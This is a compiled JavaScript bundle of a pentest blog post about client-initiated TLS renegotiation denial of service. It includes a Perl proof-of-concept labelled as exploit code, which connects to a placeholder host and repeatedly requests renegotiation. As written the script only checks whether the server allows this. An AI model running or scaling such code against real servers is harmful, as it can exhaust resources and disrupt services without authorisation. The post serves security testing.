"use strict";(self.webpackChunkjanstarke_blog=self.webpackChunkjanstarke_blog||[]).push([[5060],{3447:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>_,frontMatter:()=>i,metadata:()=>a,toc:()=>l});var s=t(5893),r=t(1151);const i={layout:"post",title:"DoSing TLS endpoints",date:new Date("2021-03-25T00:00:00.000Z"),categories:"pentest perl",authors:["jasa"]},o="The vulnerability",a={permalink:"/blog/2021/03/25/DoSing-TLS-endpoints",source:"@site/blog/2021-03-25-DoSing-TLS-endpoints.mdx",title:"DoSing TLS endpoints",description:"During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability.",date:"2021-03-25T00:00:00.000Z",tags:[],readingTime:2.65,hasTruncateMarker:!1,authors:[{name:"Jan Starke",title:"Senior Forensic Analyst",url:"https://github.com/janstarke",imageURL:"https://github.com/janstarke.png",key:"jasa"}],frontMatter:{layout:"post",title:"DoSing TLS endpoints",date:"2021-03-25T00:00:00.000Z",categories:"pentest perl",authors:["jasa"]},unlisted:!1,prevItem:{title:"$MFT file parser finalized",permalink:"/blog/2021/05/16/mft2bodyfile"},nextItem:{title:"Pairing based cryptography in Rust",permalink:"/blog/2021/02/13/Pairing_based_cryptography_in_Rust"}},c={authorsImageUrls:[void 0]},l=[];function d(e){const n={code:"code",h1:"h1",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.p,{children:"During these day, I had an interesting task: to test if som specific endpoint is vulnerable against a client-side TLS renegotiation DoS vulnerability."}),"\n",(0,s.jsx)(n.p,{children:"Negotiating a shared secret requires a lot of computation and thus needs some CPU time. The idea of the attack is to initiate a TLS connection and then request a renegotiation of the shared secret over and over again. This would consume a lot of CPU time from the server, which is the resource we're going to exhaust."}),"\n",(0,s.jsx)(n.h1,{id:"the-test",children:"The test"}),"\n",(0,s.jsx)(n.p,{children:"To exploit the vulnerability, you must make sure that the client consume much less CPU time than the server does. So, you have to tweak the renegotiation. I didn't do this, becaus I wasn't interested in really exhausting the server resources. I was only interested in the following questions:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Does the server really support client-initiated renegotiation?"}),"\n",(0,s.jsx)(n.li,{children:"How many renegotiations are allowed by the server before it terminates the connection?"}),"\n"]}),"\n",(0,s.jsx)(n.h1,{id:"what-did-i-learn",children:"What did I learn?"}),"\n",(0,s.jsx)(n.p,{children:"Most TLS implementations have removed the client-initiated renegotiation from its source code, so If you use an up-to-date implementation, chances are good that you are not vulnerable."}),"\n",(0,s.jsx)(n.h1,{id:"expoit-source-code",children:"Expoit source code"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-perl",children:'use Socket;\nuse Net::SSLeay qw(die_now die_if_ssl_error) ;\nuse strict;\nuse warnings;\nuse Errno qw(EINTR EIO :POSIX);\nuse IO::Socket::INET;\n\nNet::SSLeay::load_error_strings();\nNet::SSLeay::SSLeay_add_ssl_algorithms();\nNet::SSLeay::randomize();\n\nmy $hostname = "<yourhost>";\nmy $port = "443";\nmy $request = "HEAD / HTTP/1.1\\r\\n\\r\\n";\n\nsub error_name($) {\n    my $id = shift;\n    my @errors = (\n        \'SSL_ERROR_NONE\',\n        \'SSL_ERROR_SSL\',\n        \'SSL_ERROR_WANT_READ\',\n        \'SSL_ERROR_WANT_WRITE\',\n        \'SSL_ERROR_WANT_X509_LOOKUP\',\n        \'SSL_ERROR_SYSCALL\',\n        \'SSL_ERROR_ZERO_RETURN\',\n        \'SSL_ERROR_WANT_CONNECT\',\n        \'SSL_ERROR_WANT_ACCEPT\'\n    );\n    die "invalid error number" unless $errors[$id];\n    my $result;\n    return $errors[$id];\n}\n\nsub display_result($$$) {\n    my $ssl = shift;\n    my $result = shift;\n    my $function = shift;\n\n    die_if_ssl_error("ssl $function ($!)");\n\n    if (0 != (my $error_id = Net::SSLeay::get_error($ssl, $result))) {\n        my $error = error_name($error_id);\n        print ("$function() = $error\\n");\n\n        while (0 != (my $rv = Net::SSLeay::ERR_get_error())) {\n            my $error_desc = Net::SSLeay::ERR_error_string($rv);\n            print ("stack: $error_desc\\n");\n        }\n    }\n}\n\nsub set_options($$) {\n    my $ctx = shift;\n    my $option = shift;\n    Net::SSLeay::CTX_set_options($ctx, $option)\n     and die_if_ssl_error("ssl ctx set options ($!)");\n}\n\nsub set_version($$) {\n    my $ctx = shift;\n    my $version = shift;\n    Net::SSLeay::CTX_set_ssl_version($ctx, $version)\n     and die_if_ssl_error("ssl ctx set version ($!)");\n}\n\nsub set_ciphers($$) {\n    my $ctx = shift;\n    my $ciphers = shift;\n    Net::SSLeay::CTX_set_cipher_list($ctx, $ciphers)\n     and die_if_ssl_error("ssl ctx set ciphers suites ($!)");\n}\n\nsub ssl_connect($$) {\n    my $ctx = shift;\n    my $socket = shift;\n    my $ssl = Net::SSLeay::new($ctx) or die_now("Failed to create SSL $!");\n    Net::SSLeay::set_fd($ssl, $socket->fileno);\n    my $res = Net::SSLeay::connect($ssl) and die_if_ssl_error("ssl connect ($!)");\n    my $error = error_name(Net::SSLeay::get_error($ssl, $res));\n    print ("connect() = $error\\n");\n    print "Cipher `" . Net::SSLeay::get_cipher($ssl) . "\'\\n";\n    return $ssl;\n}\n\nsub configure_context($$) {\n    my $ctx = shift;\n    my $ciphers = shift;\n    set_options($ctx, &Net::SSLeay::OP_ALL);\n    set_options($ctx, &Net::SSLeay::OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);\n    #set_options($ctx, &Net::SSLeay::OP_SSL_OP_LEGACY_SERVER_CONNECT);\n    set_version($ctx, &Net::SSLeay::TLSv1_2_method);\n    set_ciphers($ctx, $ciphers);\n}\nmy $socket = IO::Socket::INET->new(\n    Type => IO::Socket::SOCK_STREAM,\n    Proto => \'tcp\',\n    PeerAddr => $hostname,\n    PeerPort => $port,\n    Blocking => 1\n) or die ("unable to connect: $!\\n");\n\n \nmy $ctx = Net::SSLeay::CTX_new() or die_now("Failed to create SSL_CTX $!");\nconfigure_context($ctx, "DHE:EDH:ECDHE:EECDH:RSA:DH:ECDH");\nmy $ssl = ssl_connect($ctx, $socket);\n\nmy $ret;\nfor (my $i=0; $i<2; $i++) {\n    Net::SSLeay::renegotiate($ssl);\n    die_if_ssl_error("ssl renegotiate ($!)");\n\n    if (! $socket->connected()) {\n        die("network connection has died");\n    }\n\n    $ret = Net::SSLeay::do_handshake($ssl);\n    display_result($ssl, $ret, "do_handshake");\n}\n\nNet::SSLeay::free ($ssl);               # Tear down connection\nNet::SSLeay::CTX_free ($ctx);\nclose $socket;\n'})})]})}function _(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},1151:(e,n,t)=>{t.d(n,{Z:()=>a,a:()=>o});var s=t(7294);const r={},i=s.createContext(r);function o(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);